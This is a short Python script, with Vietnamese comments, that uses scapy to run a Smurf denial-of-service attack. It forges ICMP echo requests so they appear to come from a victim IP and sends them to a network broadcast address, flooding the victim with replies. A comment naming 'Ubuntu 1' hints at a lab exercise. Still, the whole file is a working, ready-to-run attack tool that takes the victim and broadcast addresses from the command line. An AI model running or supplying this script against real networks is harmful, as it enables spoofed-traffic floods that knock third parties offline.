from scapy.all import *
import sys

def smurf_attack(target_ip, broadcast_ip, count=100):
    print(f"Thực hiện tấn công Smurf từ IP giả mạo {target_ip} đến broadcast {broadcast_ip}")
    for i in range(count):
        # Tạo gói tin ICMP echo request với địa chỉ nguồn giả mạo là máy nạn nhân
        packet = IP(src=target_ip, dst=broadcast_ip) / ICMP()
        send(packet, verbose=0)
        if i % 10 == 0:
            print(f"Đã gửi {i} gói tin...")
    print(f"Hoàn thành tấn công, đã gửi {count} gói tin")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Sử dụng: python smurf_attack.py <địa_chỉ_IP_nạn_nhân> <địa_chỉ_broadcast>")
        sys.exit(1)
    
    target_ip = sys.argv[1]  # IP của máy nạn nhân (Ubuntu 1)
    broadcast_ip = sys.argv[2]  # Địa chỉ broadcast của mạng
    smurf_attack(target_ip, broadcast_ip)
